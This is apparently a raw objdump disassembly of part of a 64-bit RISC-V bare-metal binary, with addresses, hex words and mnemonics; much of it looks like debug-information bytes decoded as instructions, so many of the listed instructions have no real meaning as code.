    178e:	0049                	c.nop	18
    1790:	0000                	unimp
    1792:	2588                	fld	fa0,8(a1)
    1794:	8000                	0x8000
    1796:	0000                	unimp
    1798:	0000                	unimp
    179a:	0070                	addi	a2,sp,12
    179c:	0000                	unimp
    179e:	0000                	unimp
    17a0:	0000                	unimp
    17a2:	9c01                	subw	s0,s0,s0
    17a4:	0afc                	addi	a5,sp,348
    17a6:	0000                	unimp
    17a8:	7326                	ld	t1,104(sp)
    17aa:	0031                	c.nop	12
    17ac:	af02                	fsd	ft0,408(sp)
    17ae:	1801                	addi	a6,a6,-32
    17b0:	064a                	slli	a2,a2,0x12
    17b2:	0000                	unimp
    17b4:	9102                	jalr	sp
    17b6:	2658                	fld	fa4,136(a2)
    17b8:	02003273          	csrrc	tp,0x20,zero
    17bc:	4a2801af          	0x4a2801af
    17c0:	0006                	c.slli	zero,0x1
    17c2:	0200                	addi	s0,sp,256
    17c4:	5091                	li	ra,-28
    17c6:	00316327          	0x316327
    17ca:	b102                	fsd	ft0,160(sp)
    17cc:	1101                	addi	sp,sp,-32
    17ce:	0034                	addi	a3,sp,8
    17d0:	0000                	unimp
    17d2:	9102                	jalr	sp
    17d4:	3263276f          	jal	a4,33afa <_tbss_end+0x33a76>
    17d8:	0200                	addi	s0,sp,256
    17da:	01b1                	addi	gp,gp,12
    17dc:	3415                	addiw	s0,s0,-27
    17de:	0000                	unimp
    17e0:	0200                	addi	s0,sp,256
    17e2:	6e91                	lui	t4,0x4
    17e4:	2900                	fld	fs0,16(a0)
    17e6:	0639                	addi	a2,a2,14
    17e8:	0000                	unimp
    17ea:	ae09770b          	0xae09770b
    17ee:	0000                	unimp
    17f0:	3a00                	fld	fs0,48(a2)
    17f2:	0025                	c.nop	9
    17f4:	0080                	addi	s0,sp,64
    17f6:	0000                	unimp
    17f8:	4e00                	lw	s0,24(a2)
    17fa:	0000                	unimp
    17fc:	0000                	unimp
    17fe:	0000                	unimp
    1800:	0100                	addi	s0,sp,128
    1802:	499c                	lw	a5,16(a1)
    1804:	2600000b          	0x2600000b
    1808:	a7020073          	0xa7020073
    180c:	1c01                	addi	s8,s8,-32
    180e:	064a                	slli	a2,a2,0x12
    1810:	0000                	unimp
    1812:	9102                	jalr	sp
    1814:	2658                	fld	fa4,136(a2)
    1816:	006e                	c.slli	zero,0x1b
    1818:	a702                	fsd	ft0,392(sp)
    181a:	2601                	sext.w	a2,a2
    181c:	00ae                	slli	ra,ra,0xb
    181e:	0000                	unimp
    1820:	9102                	jalr	sp
    1822:	2750                	fld	fa2,136(a4)
    1824:	0070                	addi	a2,sp,12
    1826:	a902                	fsd	ft0,144(sp)
    1828:	0f01                	addi	t5,t5,0
    182a:	064a                	slli	a2,a2,0x12
    182c:	0000                	unimp
    182e:	9102                	jalr	sp
    1830:	0068                	addi	a0,sp,12
    1832:	2129                	addiw	sp,sp,10
    1834:	0006                	c.slli	zero,0x1
    1836:	0b00                	addi	s0,sp,400
    1838:	0929                	addi	s2,s2,10
    183a:	00ae                	slli	ra,ra,0xb
    183c:	0000                	unimp
    183e:	24fe                	fld	fs1,472(sp)
    1840:	8000                	0x8000
    1842:	0000                	unimp
    1844:	0000                	unimp
    1846:	003c                	addi	a5,sp,8
    1848:	0000                	unimp
    184a:	0000                	unimp
    184c:	0000                	unimp
    184e:	9c01                	subw	s0,s0,s0
    1850:	0b88                	addi	a0,sp,464
    1852:	0000                	unimp
    1854:	7326                	ld	t1,104(sp)
    1856:	0200                	addi	s0,sp,256
    1858:	019f 4a1b 0006      	0x64a1b019f
    185e:	0200                	addi	s0,sp,256
    1860:	5891                	li	a7,-28
    1862:	02007027          	0x2007027
    1866:	01a1                	addi	gp,gp,8
    1868:	00064a0f          	0x64a0f
    186c:	0200                	addi	s0,sp,256
    186e:	6891                	lui	a7,0x4
    1870:	2900                	fld	fs0,16(a0)
    1872:	076a                	slli	a4,a4,0x1a
    1874:	0000                	unimp
    1876:	5b09210b          	0x5b09210b
    187a:	0001                	nop
    187c:	3000                	fld	fs0,32(s0)
    187e:	0024                	addi	s1,sp,8
    1880:	0080                	addi	s0,sp,64
    1882:	0000                	unimp
    1884:	ce00                	sw	s0,24(a2)
    1886:	0000                	unimp
    1888:	0000                	unimp
    188a:	0000                	unimp
    188c:	0100                	addi	s0,sp,128
    188e:	309c                	fld	fa5,32(s1)
    1890:	000c                	0xc
    1892:	2a00                	fld	fs0,16(a2)
    1894:	0934                	addi	a3,sp,152
    1896:	0000                	unimp
    1898:	8c02                	jr	s8
    189a:	1401                	addi	s0,s0,-32
    189c:	0000015b          	0x15b
    18a0:	9102                	jalr	sp
    18a2:	2a48                	fld	fa0,144(a2)
    18a4:	08ba                	slli	a7,a7,0xe
    18a6:	0000                	unimp
    18a8:	8c02                	jr	s8
    18aa:	1e01                	addi	t3,t3,-32
    18ac:	0049                	c.nop	18
    18ae:	0000                	unimp
    18b0:	9102                	jalr	sp
    18b2:	2644                	fld	fs1,136(a2)
    18b4:	656c                	ld	a1,200(a0)
    18b6:	006e                	c.slli	zero,0x1b
    18b8:	8c02                	jr	s8
    18ba:	2b01                	sext.w	s6,s6
    18bc:	00ae                	slli	ra,ra,0xb
    18be:	0000                	unimp
    18c0:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    18c4:	0024522b          	0x24522b
    18c8:	0080                	addi	s0,sp,64
    18ca:	0000                	unimp
    18cc:	6c00                	ld	s0,24(s0)
    18ce:	0000                	unimp
    18d0:	0000                	unimp
    18d2:	0000                	unimp
    18d4:	0f00                	addi	s0,sp,912
    18d6:	000c                	0xc
    18d8:	2800                	fld	fs0,16(s0)
    18da:	0820                	addi	s0,sp,24
    18dc:	0000                	unimp
    18de:	8f02                	jr	t5
    18e0:	0f01                	addi	t5,t5,0
    18e2:	009d                	addi	ra,ra,7
    18e4:	0000                	unimp
    18e6:	9102                	jalr	sp
    18e8:	2758                	fld	fa4,136(a4)
    18ea:	0064                	addi	s1,sp,12
    18ec:	9402                	jalr	s0
    18ee:	1001                	c.nop	-32
    18f0:	0c30                	addi	a2,sp,536
    18f2:	0000                	unimp
    18f4:	9102                	jalr	sp
    18f6:	0068                	addi	a0,sp,12
    18f8:	be2c                	fsd	fa1,120(a2)
    18fa:	0024                	addi	s1,sp,8
    18fc:	0080                	addi	s0,sp,64
    18fe:	0000                	unimp
    1900:	3400                	fld	fs0,40(s0)
    1902:	0000                	unimp
    1904:	0000                	unimp
    1906:	0000                	unimp
    1908:	2700                	fld	fs0,8(a4)
    190a:	0064                	addi	s1,sp,12
    190c:	9802                	jalr	a6
    190e:	0b01                	addi	s6,s6,0
    1910:	0614                	addi	a3,sp,768
    1912:	0000                	unimp
    1914:	9102                	jalr	sp
    1916:	0060                	addi	s0,sp,12
    1918:	1200                	addi	s0,sp,288
    191a:	9d08                	0x9d08
    191c:	0000                	unimp
    191e:	2900                	fld	fs0,16(a0)
    1920:	08fd                	addi	a7,a7,31
    1922:	0000                	unimp
    1924:	5b091f0b          	0x5b091f0b
    1928:	0001                	nop
    192a:	7800                	ld	s0,48(s0)
    192c:	00800023          	sb	s0,0(zero) # 0 <_tdata_begin>
    1930:	0000                	unimp
    1932:	b800                	fsd	fs0,48(s0)
    1934:	0000                	unimp
    1936:	0000                	unimp
    1938:	0000                	unimp
    193a:	0100                	addi	s0,sp,128
    193c:	ea9c                	sd	a5,16(a3)
    193e:	000c                	0xc
    1940:	2a00                	fld	fs0,16(a2)
    1942:	0934                	addi	a3,sp,152
    1944:	0000                	unimp
    1946:	7c02                	ld	s8,32(sp)
    1948:	1401                	addi	s0,s0,-32
    194a:	0000015b          	0x15b
    194e:	9102                	jalr	sp
    1950:	2648                	fld	fa0,136(a2)
    1952:	00637273          	csrrci	tp,0x6,6
    1956:	7c02                	ld	s8,32(sp)
    1958:	2601                	sext.w	a2,a2
    195a:	0cea                	slli	s9,s9,0x1a
    195c:	0000                	unimp
    195e:	9102                	jalr	sp
    1960:	2640                	fld	fs0,136(a2)
    1962:	656c                	ld	a1,200(a0)
    1964:	006e                	c.slli	zero,0x1b
    1966:	7c02                	ld	s8,32(sp)
    1968:	3201                	addiw	tp,tp,-32
    196a:	00ae                	slli	ra,ra,0xb
    196c:	0000                	unimp
    196e:	7fb89103          	lh	sp,2043(a7)
    1972:	00239e2b          	0x239e2b
    1976:	0080                	addi	s0,sp,64
    1978:	0000                	unimp
    197a:	4200                	lw	s0,0(a2)
    197c:	0000                	unimp
    197e:	0000                	unimp
    1980:	0000                	unimp
    1982:	bb00                	fsd	fs0,48(a4)
    1984:	000c                	0xc
    1986:	2700                	fld	fs0,8(a4)
    1988:	7f020073          	0x7f020073
    198c:	1601                	addi	a2,a2,-32
    198e:	0cf1                	addi	s9,s9,28
    1990:	0000                	unimp
    1992:	9102                	jalr	sp
    1994:	2768                	fld	fa0,200(a4)
    1996:	0064                	addi	s1,sp,12
    1998:	8002                	0x8002
    199a:	1001                	c.nop	-32
    199c:	0c30                	addi	a2,sp,536
    199e:	0000                	unimp
    19a0:	9102                	jalr	sp
    19a2:	0060                	addi	s0,sp,12
    19a4:	e02c                	sd	a1,64(s0)
    19a6:	00800023          	sb	s0,0(zero) # 0 <_tdata_begin>
    19aa:	0000                	unimp
    19ac:	4400                	lw	s0,8(s0)
    19ae:	0000                	unimp
    19b0:	0000                	unimp
    19b2:	0000                	unimp
    19b4:	2700                	fld	fs0,8(a4)
    19b6:	84020073          	0x84020073
    19ba:	1101                	addi	sp,sp,-32
    19bc:	064a                	slli	a2,a2,0x12
    19be:	0000                	unimp
    19c0:	9102                	jalr	sp
    19c2:	2758                	fld	fa4,136(a4)
    19c4:	0064                	addi	s1,sp,12
    19c6:	8502                	jr	a0
    19c8:	0b01                	addi	s6,s6,0
    19ca:	0614                	addi	a3,sp,768
    19cc:	0000                	unimp
    19ce:	9102                	jalr	sp
    19d0:	0050                	addi	a2,sp,4
    19d2:	1200                	addi	s0,sp,288
    19d4:	f008                	sd	a0,32(s0)
    19d6:	000c                	0xc
    19d8:	2d00                	fld	fs0,24(a0)
    19da:	0812                	slli	a6,a6,0x4
    19dc:	00a9                	addi	ra,ra,10
    19de:	0000                	unimp
    19e0:	c92e                	sw	a1,144(sp)
    19e2:	03000007          	0x3000007
    19e6:	05f4                	addi	a3,sp,716
    19e8:	0049                	c.nop	18
    19ea:	0000                	unimp
    19ec:	22b6                	fld	ft5,328(sp)
    19ee:	8000                	0x8000
    19f0:	0000                	unimp
    19f2:	0000                	unimp
    19f4:	00c2                	slli	ra,ra,0x10
    19f6:	0000                	unimp
    19f8:	0000                	unimp
    19fa:	0000                	unimp
    19fc:	9c01                	subw	s0,s0,s0
    19fe:	0db1                	addi	s11,s11,12
    1a00:	0000                	unimp
    1a02:	7326                	ld	t1,104(sp)
    1a04:	7274                	ld	a3,224(a2)
    1a06:	0200                	addi	s0,sp,256
    1a08:	0168                	addi	a0,sp,140
    1a0a:	00061413          	slli	s0,a2,0x0
    1a0e:	0300                	addi	s0,sp,384
    1a10:	8891                	andi	s1,s1,4
    1a12:	267e                	fld	fa2,472(sp)
    1a14:	6d66                	ld	s10,88(sp)
    1a16:	0074                	addi	a3,sp,12
    1a18:	6802                	ld	a6,0(sp)
    1a1a:	2401                	sext.w	s0,s0
    1a1c:	064a                	slli	a2,a2,0x12
    1a1e:	0000                	unimp
    1a20:	7e809103          	lh	sp,2024(ra)
    1a24:	7061272f          	0x7061272f
    1a28:	0200                	addi	s0,sp,256
    1a2a:	016a                	slli	sp,sp,0x1a
    1a2c:	0009880b          	0x9880b
    1a30:	0300                	addi	s0,sp,384
    1a32:	b091                	j	1276 <_tbss_end+0x11f2>
    1a34:	287f                	0x287f
    1a36:	06ee                	slli	a3,a3,0x1b
    1a38:	0000                	unimp
    1a3a:	6b02                	ld	s6,0(sp)
    1a3c:	0901                	addi	s2,s2,0
    1a3e:	0614                	addi	a3,sp,768
    1a40:	0000                	unimp
    1a42:	7fb89103          	lh	sp,2043(a7)
    1a46:	ac30                	fsd	fa2,88(s0)
    1a48:	0008                	0x8
    1a4a:	0200                	addi	s0,sp,256
    1a4c:	016e                	slli	sp,sp,0x1b
    1a4e:	7008                	ld	a0,32(s0)
    1a50:	0022                	c.slli	zero,0x8
    1a52:	0080                	addi	s0,sp,64
    1a54:	0000                	unimp
    1a56:	4600                	lw	s0,8(a2)
    1a58:	0000                	unimp
    1a5a:	0000                	unimp
    1a5c:	0000                	unimp
    1a5e:	0100                	addi	s0,sp,128
    1a60:	079c                	addi	a5,sp,960
    1a62:	4891                	li	a7,4
    1a64:	2306                	fld	ft6,64(sp)
    1a66:	0190                	addi	a2,sp,192
    1a68:	2606                	fld	fa2,64(sp)
    1a6a:	02006863          	bltu	zero,zero,1a9a <_tbss_end+0x1a16>
    1a6e:	016e                	slli	sp,sp,0x1b
    1a70:	491a                	lw	s2,132(sp)
    1a72:	0000                	unimp
    1a74:	0200                	addi	s0,sp,256
    1a76:	5c91                	li	s9,-28
    1a78:	1c2a                	slli	s8,s8,0x2a
    1a7a:	0006                	c.slli	zero,0x1
    1a7c:	0200                	addi	s0,sp,256
    1a7e:	016e                	slli	sp,sp,0x1b
    1a80:	b125                	j	16a8 <_tbss_end+0x1624>
    1a82:	000d                	c.nop	3
    1a84:	0200                	addi	s0,sp,256
    1a86:	5091                	li	ra,-28
    1a88:	6528                	ld	a0,72(a0)
    1a8a:	02000007          	0x2000007
    1a8e:	0170                	addi	a2,sp,140
    1a90:	b70c                	fsd	fa1,40(a4)
    1a92:	000d                	c.nop	3
    1a94:	0200                	addi	s0,sp,256
    1a96:	6891                	lui	a7,0x4
    1a98:	0000                	unimp
    1a9a:	0812                	slli	a6,a6,0x4
    1a9c:	0000015b          	0x15b
    1aa0:	0812                	slli	a6,a6,0x4
    1aa2:	0614                	addi	a3,sp,768
    1aa4:	0000                	unimp
    1aa6:	992e                	add	s2,s2,a1
    1aa8:	0008                	0x8
    1aaa:	0300                	addi	s0,sp,384
    1aac:	05c8                	addi	a0,sp,708
    1aae:	0049                	c.nop	18
    1ab0:	0000                	unimp
    1ab2:	221a                	fld	ft4,384(sp)
    1ab4:	8000                	0x8000
    1ab6:	0000                	unimp
    1ab8:	0000                	unimp
    1aba:	0056                	c.slli	zero,0x15
    1abc:	0000                	unimp
    1abe:	0000                	unimp
    1ac0:	0000                	unimp
    1ac2:	9c01                	subw	s0,s0,s0
    1ac4:	0e02                	slli	t3,t3,0x0
    1ac6:	0000                	unimp
    1ac8:	6626                	ld	a2,72(sp)
    1aca:	746d                	lui	s0,0xffffb
    1acc:	0200                	addi	s0,sp,256
    1ace:	015d                	addi	sp,sp,23
    1ad0:	4a18                	lw	a4,16(a2)
    1ad2:	0006                	c.slli	zero,0x1
    1ad4:	0300                	addi	s0,sp,384
    1ad6:	9891                	andi	s1,s1,-28
    1ad8:	2f7f                	0x2f7f
    1ada:	00706127          	0x706127
    1ade:	5f02                	lw	t5,32(sp)
    1ae0:	0b01                	addi	s6,s6,0
    1ae2:	0988                	addi	a0,sp,208
    1ae4:	0000                	unimp
    1ae6:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
    1aea:	3100                	fld	fs0,32(a0)
    1aec:	0939                	addi	s2,s2,14
    1aee:	0000                	unimp
    1af0:	c602                	sw	zero,12(sp)
    1af2:	bc0d                	j	1524 <_tbss_end+0x14a0>
    1af4:	001e                	c.slli	zero,0x7
    1af6:	0080                	addi	s0,sp,64
    1af8:	0000                	unimp
    1afa:	5e00                	lw	s0,56(a2)
    1afc:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1b00:	0000                	unimp
    1b02:	0100                	addi	s0,sp,128
    1b04:	429c                	lw	a5,0(a3)
    1b06:	3200000f          	0x3200000f
    1b0a:	08b4                	addi	a3,sp,88
    1b0c:	0000                	unimp
    1b0e:	c602                	sw	zero,12(sp)
    1b10:	521e                	lw	tp,228(sp)
    1b12:	0300000f          	fence	rw,unknown
    1b16:	a891                	j	1b6a <_tbss_end+0x1ae6>
    1b18:	327f                	0x327f
    1b1a:	07b2                	slli	a5,a5,0xc
    1b1c:	0000                	unimp
    1b1e:	c602                	sw	zero,12(sp)
    1b20:	b13a                	fsd	fa4,160(sp)
    1b22:	000d                	c.nop	3
    1b24:	0300                	addi	s0,sp,384
    1b26:	a091                	j	1b6a <_tbss_end+0x1ae6>
    1b28:	337f                	0x337f
    1b2a:	6d66                	ld	s10,88(sp)
    1b2c:	0074                	addi	a3,sp,12
    1b2e:	c602                	sw	zero,12(sp)
    1b30:	4a4e                	lw	s4,208(sp)
    1b32:	0006                	c.slli	zero,0x1
    1b34:	0300                	addi	s0,sp,384
    1b36:	9891                	andi	s1,s1,-28
    1b38:	337f                	0x337f
    1b3a:	7061                	c.lui	zero,0xffff8
    1b3c:	0200                	addi	s0,sp,256
    1b3e:	5bc6                	lw	s7,112(sp)
    1b40:	0988                	addi	a0,sp,208
    1b42:	0000                	unimp
    1b44:	7f909103          	lh	sp,2041(ra)
    1b48:	7034                	ld	a3,96(s0)
    1b4a:	0200                	addi	s0,sp,256
    1b4c:	18c8                	addi	a0,sp,116
    1b4e:	064a                	slli	a2,a2,0x12
    1b50:	0000                	unimp
    1b52:	6201                	0x6201
    1b54:	2e24                	fld	fs1,88(a2)
    1b56:	02000007          	0x2000007
    1b5a:	0fc9                	addi	t6,t6,18
    1b5c:	064a                	slli	a2,a2,0x12
    1b5e:	0000                	unimp
    1b60:	7fb89103          	lh	sp,2043(a7)
    1b64:	6334                	ld	a3,64(a4)
    1b66:	0068                	addi	a0,sp,12
    1b68:	ca02                	sw	zero,20(sp)
    1b6a:	4910                	lw	a2,16(a0)
    1b6c:	0000                	unimp
    1b6e:	0100                	addi	s0,sp,128
    1b70:	3559                	addiw	a0,a0,-10
    1b72:	7265                	lui	tp,0xffff9
    1b74:	0072                	c.slli	zero,0x1c
    1b76:	ca02                	sw	zero,20(sp)
    1b78:	4914                	lw	a3,16(a0)
    1b7a:	0000                	unimp
    1b7c:	3400                	fld	fs0,40(s0)
    1b7e:	756e                	ld	a0,248(sp)
    1b80:	006d                	c.nop	27
    1b82:	cb02                	sw	zero,148(sp)
    1b84:	7416                	ld	s0,352(sp)
    1b86:	0008                	0x8
    1b88:	0200                	addi	s0,sp,256
    1b8a:	5891                	li	a7,-28
    1b8c:	eb24                	sd	s1,80(a4)
    1b8e:	0000                	unimp
    1b90:	0200                	addi	s0,sp,256
    1b92:	07cc                	addi	a1,sp,964
    1b94:	0049                	c.nop	18
    1b96:	0000                	unimp
    1b98:	9102                	jalr	sp
    1b9a:	2454                	fld	fa3,136(s0)
    1b9c:	075f 0000 cc02      	0xcc020000075f
    1ba2:	490d                	li	s2,3
    1ba4:	0000                	unimp
    1ba6:	0200                	addi	s0,sp,256
    1ba8:	5091                	li	ra,-28
    1baa:	e824                	sd	s1,80(s0)
    1bac:	0006                	c.slli	zero,0x1
    1bae:	0200                	addi	s0,sp,256
    1bb0:	14cc                	addi	a1,sp,612
    1bb2:	0049                	c.nop	18
    1bb4:	0000                	unimp
    1bb6:	9102                	jalr	sp
    1bb8:	244c                	fld	fa1,136(s0)
    1bba:	0649                	addi	a2,a2,18
    1bbc:	0000                	unimp
    1bbe:	cc02                	sw	zero,24(sp)
    1bc0:	0000491b          	0x491b
    1bc4:	0200                	addi	s0,sp,256
    1bc6:	4891                	li	a7,4
    1bc8:	f124                	sd	s1,96(a0)
    1bca:	02000007          	0x2000007
    1bce:	26cc                	fld	fa1,136(a3)
    1bd0:	0049                	c.nop	18
    1bd2:	0000                	unimp
    1bd4:	7fb49103          	lh	sp,2043(s1) # 47fb <_tbss_end+0x4777>
    1bd8:	d424                	sw	s1,104(s0)
    1bda:	0006                	c.slli	zero,0x1
    1bdc:	0200                	addi	s0,sp,256
    1bde:	08cd                	addi	a7,a7,19
    1be0:	061a                	slli	a2,a2,0x6
    1be2:	0000                	unimp
    1be4:	9102                	jalr	sp
    1be6:	073e3647          	fmsub.q	fa2,ft8,fs3,ft0,rup
    1bea:	0000                	unimp
    1bec:	df02                	sw	zero,188(sp)
    1bee:	001f3803          	ld	a6,1(t5) # 6001 <_tbss_end+0x5f7d>
    1bf2:	0080                	addi	s0,sp,64
    1bf4:	0000                	unimp
    1bf6:	3700                	fld	fs0,40(a4)
    1bf8:	0641                	addi	a2,a2,16
    1bfa:	0000                	unimp
    1bfc:	0b02                	slli	s6,s6,0x0
    1bfe:	0501                	addi	a0,a0,0
    1c00:	2012                	fld	ft0,256(sp)
    1c02:	8000                	0x8000
    1c04:	0000                	unimp
    1c06:	0000                	unimp
    1c08:	0007a437          	lui	s0,0x7a
    1c0c:	0200                	addi	s0,sp,256
    1c0e:	c405014b          	0xc405014b
    1c12:	0021                	c.nop	8
    1c14:	0080                	addi	s0,sp,64
    1c16:	0000                	unimp
    1c18:	3700                	fld	fs0,40(a4)
    1c1a:	07a2                	slli	a5,a5,0x8
    1c1c:	0000                	unimp
    1c1e:	4902                	lw	s2,0(sp)
    1c20:	0501                	addi	a0,a0,0
    1c22:	21b0                	fld	fa2,64(a1)
    1c24:	8000                	0x8000
    1c26:	0000                	unimp
    1c28:	0000                	unimp
    1c2a:	2100                	fld	fs0,0(a0)
    1c2c:	0f52                	slli	t5,t5,0x14
    1c2e:	0000                	unimp
    1c30:	00004917          	auipc	s2,0x4
    1c34:	1700                	addi	s0,sp,928
    1c36:	0db1                	addi	s11,s11,12
    1c38:	0000                	unimp
    1c3a:	1200                	addi	s0,sp,288
    1c3c:	4208                	lw	a0,0(a2)
    1c3e:	3800000f          	0x3800000f
    1c42:	0000079b          	sext.w	a5,zero
    1c46:	bc02                	fsd	ft0,56(sp)
    1c48:	ba12                	fsd	ft4,304(sp)
    1c4a:	0000                	unimp
    1c4c:	5400                	lw	s0,40(s0)
    1c4e:	001e                	c.slli	zero,0x7
    1c50:	0080                	addi	s0,sp,64
    1c52:	0000                	unimp
    1c54:	6800                	ld	s0,16(s0)
    1c56:	0000                	unimp
    1c58:	0000                	unimp
    1c5a:	0000                	unimp
    1c5c:	0100                	addi	s0,sp,128
    1c5e:	989c                	0x989c
    1c60:	3300000f          	0x3300000f
    1c64:	7061                	c.lui	zero,0xffff8
    1c66:	0200                	addi	s0,sp,256
    1c68:	22bc                	fld	fa5,64(a3)
    1c6a:	0f98                	addi	a4,sp,976
    1c6c:	0000                	unimp
    1c6e:	9102                	jalr	sp
    1c70:	3268                	fld	fa0,224(a2)
    1c72:	075f 0000 bc02      	0xbc020000075f
    1c78:	492a                	lw	s2,136(sp)
    1c7a:	0000                	unimp
    1c7c:	0200                	addi	s0,sp,256
    1c7e:	6491                	lui	s1,0x4
    1c80:	1200                	addi	s0,sp,288
    1c82:	8808                	0x8808
    1c84:	0009                	c.nop	2
    1c86:	3800                	fld	fs0,48(s0)
    1c88:	0669                	addi	a2,a2,26
    1c8a:	0000                	unimp
    1c8c:	b202                	fsd	ft0,288(sp)
    1c8e:	0008741b          	0x8741b
    1c92:	e800                	sd	s0,16(s0)
    1c94:	001d                	c.nop	7
    1c96:	0080                	addi	s0,sp,64
    1c98:	0000                	unimp
    1c9a:	6c00                	ld	s0,24(s0)
    1c9c:	0000                	unimp
    1c9e:	0000                	unimp
    1ca0:	0000                	unimp
    1ca2:	0100                	addi	s0,sp,128
    1ca4:	de9c                	sw	a5,56(a3)
    1ca6:	3300000f          	0x3300000f
    1caa:	7061                	c.lui	zero,0xffff8
    1cac:	0200                	addi	s0,sp,256
    1cae:	2cb2                	fld	fs9,264(sp)
    1cb0:	0f98                	addi	a4,sp,976
    1cb2:	0000                	unimp
    1cb4:	9102                	jalr	sp
    1cb6:	3268                	fld	fa0,224(a2)
    1cb8:	075f 0000 b202      	0xb2020000075f
    1cbe:	4934                	lw	a3,80(a0)
    1cc0:	0000                	unimp
    1cc2:	0200                	addi	s0,sp,256
    1cc4:	6491                	lui	s1,0x4
    1cc6:	3100                	fld	fs0,32(a0)
    1cc8:	000006af          	0x6af
    1ccc:	9d02                	jalr	s10
    1cce:	e614                	sd	a3,8(a2)
    1cd0:	001c                	0x1c
    1cd2:	0080                	addi	s0,sp,64
    1cd4:	0000                	unimp
    1cd6:	0200                	addi	s0,sp,256
    1cd8:	0001                	nop
    1cda:	0000                	unimp
    1cdc:	0000                	unimp
    1cde:	0100                	addi	s0,sp,128
    1ce0:	7c9c                	ld	a5,56(s1)
    1ce2:	0010                	0x10
    1ce4:	3200                	fld	fs0,32(a2)
    1ce6:	08b4                	addi	a3,sp,88
    1ce8:	0000                	unimp
    1cea:	9d02                	jalr	s10
    1cec:	5224                	lw	s1,96(a2)
    1cee:	0300000f          	fence	rw,unknown
    1cf2:	d891                	beqz	s1,1c06 <_tbss_end+0x1b82>
    1cf4:	327d                	addiw	tp,tp,-1
    1cf6:	07b2                	slli	a5,a5,0xc
    1cf8:	0000                	unimp
    1cfa:	9d02                	jalr	s10
    1cfc:	b140                	fsd	fs0,160(a0)
    1cfe:	000d                	c.nop	3
    1d00:	0300                	addi	s0,sp,384
    1d02:	d091                	beqz	s1,1c06 <_tbss_end+0x1b82>
    1d04:	337d                	addiw	t1,t1,-1
    1d06:	756e                	ld	a0,248(sp)
    1d08:	006d                	c.nop	27
    1d0a:	9e02                	jalr	t3
    1d0c:	7428                	ld	a0,104(s0)
    1d0e:	0008                	0x8
    1d10:	0300                	addi	s0,sp,384
    1d12:	c891                	beqz	s1,1d26 <_tbss_end+0x1ca2>
    1d14:	327d                	addiw	tp,tp,-1
    1d16:	000000eb          	0xeb
    1d1a:	9e02                	jalr	t3
    1d1c:	5f36                	lw	t5,108(sp)
    1d1e:	0000                	unimp
    1d20:	0300                	addi	s0,sp,384
    1d22:	c491                	beqz	s1,1d2e <_tbss_end+0x1caa>
    1d24:	327d                	addiw	tp,tp,-1
    1d26:	06e8                	addi	a0,sp,844
    1d28:	0000                	unimp
    1d2a:	9e02                	jalr	t3
    1d2c:	4940                	lw	s0,20(a0)
    1d2e:	0000                	unimp
    1d30:	0300                	addi	s0,sp,384
    1d32:	c091                	beqz	s1,1d36 <_tbss_end+0x1cb2>
    1d34:	327d                	addiw	tp,tp,-1
    1d36:	06d4                	addi	a3,sp,836
    1d38:	0000                	unimp
    1d3a:	9e02                	jalr	t3
    1d3c:	0000494b          	fnmsub.s	fs2,ft0,ft0,ft0,rmm
    1d40:	0300                	addi	s0,sp,384
    1d42:	bc91                	j	1796 <_tbss_end+0x1712>
    1d44:	247d                	addiw	s0,s0,31
    1d46:	000008a7          	0x8a7
    1d4a:	a002                	fsd	ft0,0(sp)
    1d4c:	7c0c                	ld	a1,56(s0)
    1d4e:	0010                	0x10
    1d50:	0300                	addi	s0,sp,384
    1d52:	e891                	bnez	s1,1d66 <_tbss_end+0x1ce2>
    1d54:	347d                	addiw	s0,s0,-1
    1d56:	6f70                	ld	a2,216(a4)
    1d58:	a1020073          	0xa1020073
    1d5c:	00004907          	flq	fs2,0(zero) # ffffffffffff8000 <_end+0xffffffff7ffdcd80>
    1d60:	0200                	addi	s0,sp,256
    1d62:	6c91                	lui	s9,0x4
    1d64:	0a00                	addi	s0,sp,272
    1d66:	005f 0000 108c      	0x108c0000005f
    1d6c:	0000                	unimp
    1d6e:	0000790b          	0x790b
    1d72:	3f00                	fld	fs0,56(a4)
    1d74:	3900                	fld	fs0,48(a0)
    1d76:	000008bf 58068f02 	0x58068f02000008bf
    1d7e:	001c                	0x1c
    1d80:	0080                	addi	s0,sp,64
    1d82:	0000                	unimp
    1d84:	8e00                	0x8e00
    1d86:	0000                	unimp
    1d88:	0000                	unimp
    1d8a:	0000                	unimp
    1d8c:	0100                	addi	s0,sp,128
    1d8e:	d49c                	sw	a5,40(s1)
    1d90:	0010                	0x10
    1d92:	3300                	fld	fs0,32(a4)
    1d94:	0078                	addi	a4,sp,12
    1d96:	8f02                	jr	t5
    1d98:	8c18                	0x8c18
    1d9a:	0000                	unimp
    1d9c:	0200                	addi	s0,sp,256
    1d9e:	4891                	li	a7,4
    1da0:	7334                	ld	a3,96(a4)
    1da2:	7274                	ld	a3,224(a2)
    1da4:	0200                	addi	s0,sp,256
    1da6:	0891                	addi	a7,a7,4
    1da8:	10d4                	addi	a3,sp,100
    1daa:	0000                	unimp
    1dac:	9102                	jalr	sp
    1dae:	3458                	fld	fa4,168(s0)
    1db0:	0069                	c.nop	26
    1db2:	9202                	jalr	tp
    1db4:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1db8:	0200                	addi	s0,sp,256
    1dba:	6c91                	lui	s9,0x4
    1dbc:	0a00                	addi	s0,sp,272
    1dbe:	061a                	slli	a2,a2,0x6
    1dc0:	0000                	unimp
    1dc2:	10e4                	addi	s1,sp,108
    1dc4:	0000                	unimp
    1dc6:	0000790b          	0x790b
    1dca:	1000                	addi	s0,sp,32
    1dcc:	2e00                	fld	fs0,24(a2)
    1dce:	0671                	addi	a2,a2,28
    1dd0:	0000                	unimp
    1dd2:	4905dc03          	lhu	s8,1168(a1)
    1dd6:	0000                	unimp
    1dd8:	e600                	sd	s0,8(a2)
    1dda:	0080001b          	addiw	zero,zero,8
    1dde:	0000                	unimp
    1de0:	7200                	ld	s0,32(a2)
    1de2:	0000                	unimp
    1de4:	0000                	unimp
    1de6:	0000                	unimp
    1de8:	0100                	addi	s0,sp,128
    1dea:	2e9c                	fld	fa5,24(a3)
    1dec:	0011                	c.nop	4
    1dee:	3300                	fld	fs0,32(a4)
    1df0:	02006863          	bltu	zero,zero,1e20 <_tbss_end+0x1d9c>
    1df4:	117f                	0x117f
    1df6:	0049                	c.nop	18
    1df8:	0000                	unimp
    1dfa:	9102                	jalr	sp
    1dfc:	3a6c                	fld	fa1,240(a2)
